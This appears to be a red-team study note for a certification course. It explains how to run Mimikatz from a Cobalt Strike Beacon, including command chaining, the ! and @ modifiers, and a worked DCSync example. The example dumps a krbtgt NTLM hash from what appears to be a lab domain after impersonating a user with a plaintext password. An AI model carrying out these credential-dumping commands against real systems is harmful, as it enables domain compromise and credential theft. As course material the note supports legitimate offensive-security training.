
Check for [[Mimikatz]] for further information on the tool.
Cobalt Strike has a built-in version of Mimikatz that we can use to extract various credential types.  However, there are some differences with how it behaves in Beacon compared to the console version.  

Each time you execute Mimikatz in Beacon, it does so in a new temporary process which is then destroyed.  This means you can't run two "related" commands, such as:

```
beacon> mimikatz token::elevate
beacon> mimikatz lsadump::sam
```
You need to chain them.

## 🖊️ Command shortcuts

1) Since CS 4.8, you can chain multiple commands together by separating them with a semi-colon.

	`beacon> mimikatz token::elevate ; lsadump::sam`

Here, you are (from an elevate beacon session) elevating your token privileges to nt authority system and dumpling the SAM db.

2) Beacon also has its own command convention using the `!` and `@` symbols as "modifiers".

The `!` elevates Beacon to SYSTEM before running the given command, which is useful in cases where you're running in high-integrity but need to impersonate SYSTEM.  In most cases, `!` is a direct replacement for `token::elevate`. For example:

	`beacon> mimikatz !lsadump::sam`

3) The `@` impersonates Beacon's thread token before running the given command, which is useful in cases where Mimikatz needs to interact with a remote system, such as with [[dcsync]].  This is also compatible with other impersonation primitives such as `make_token` and `steal_token`.  For example:

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> make_token DEV\nlamb F3rrari
[+] Impersonated DEV\nlamb (netonly)

beacon> mimikatz @lsadump::dcsync /user:DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 8/15/2022 4:01:04 PM
Object Security ID   : S-1-5-21-569305411-121244042-2357301523-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
    lm  - 0: 207d5e08551c51892309c0cf652c353b
```


### Properties
---
📆 created   {{10-02-2024}} 21:45
🏷️ tags: #redteam #crto #activedirectory 

---

